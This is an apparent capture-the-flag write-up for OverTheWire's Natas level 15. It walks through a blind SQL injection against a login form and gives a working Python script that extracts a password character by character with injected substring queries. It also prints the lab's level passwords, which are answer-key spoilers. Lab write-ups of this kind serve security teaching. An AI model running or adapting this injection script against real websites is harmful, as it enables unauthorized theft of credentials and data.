# Natas CTF Solutions  

## Natas Level 15  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Use **Blind SQL Injection** to extract the password from the database.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas15.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas15`  
- **Password:** Use the password from Natas Level 14:  
```
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```  

![Home_Page](https://github.com/user-attachments/assets/b4a4af45-ef96-4333-b925-1785b4b4f095)

---

### **Step 3: Analyze the Webpage**  
- The page contains a **login form** that verifies if a user exists.  
- Viewing the **page source** reveals that the login logic is processed through an SQL query.  
- The logic is vulnerable to **Blind SQL Injection**.  

![Page_Source](https://github.com/user-attachments/assets/86ae6123-f390-4f95-ba22-4ac07590cbcc)

---

### **Step 4: Understand the Vulnerability**  
The SQL query works like this:  
```sql
SELECT * FROM users WHERE username="natas16" AND BINARY substring(password,1,N) = 'abc'
```
- The query checks the **substring** of the password character by character.  
- If the substring matches, the response returns **"This user exists."**  

---

### **Step 5: Automate with Python**  
Use the following Python script to automate the Blind SQL Injection attack:  

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
password = ""  # Start with an empty password
count = 1  
PASSWORD_LENGTH = 32  
VALID_CHARS = string.digits + string.ascii_letters

while count <= PASSWORD_LENGTH:
    for c in VALID_CHARS:
        payload = f'username=natas16" AND BINARY substring(password,1,{count}) = "{password + c}" -- '

        response = requests.post(url, data=payload, headers=headers, auth=basicAuth, verify=False)

        if 'This user exists.' in response.text:
            print(f"Found one more char: {password + c}")
            password += c
            count += 1
            break

print(f"Password found: {password}")
```

---

### **Step 6: Explanation**  
✅ The script:  
- Tries each character from `VALID_CHARS`.  
- If the response contains **"This user exists."**, the character is part of the correct password.  
- Continues until the full password is revealed.  

![Password](https://github.com/user-attachments/assets/4922c018-6f80-4533-b804-1844130d089e)

---

### **Step 7: Retrieve the Password**  
After running the script, the password for **Natas Level 16** is revealed:  

---

### **✅ Password for Natas Level 16**  
```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```  

---

## 💡 **Lessons Learned**  
✔️ **Blind SQL Injection**: When the output is not directly visible, you can use conditional responses to extract information.  
✔️ **Binary Keyword**: The `BINARY` keyword ensures case sensitivity during substring matching.  
✔️ **Automating Attacks**: Automating attacks with Python makes it easier to test multiple payloads efficiently.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Page Source with Login Logic | ![Page_Source](https://github.com/user-attachments/assets/86ae6123-f390-4f95-ba22-4ac07590cbcc) |  
| Step 7 – Found Password | ![Password](https://github.com/user-attachments/assets/4922c018-6f80-4533-b804-1844130d089e) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 16**:  
👉 [http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org)  

---
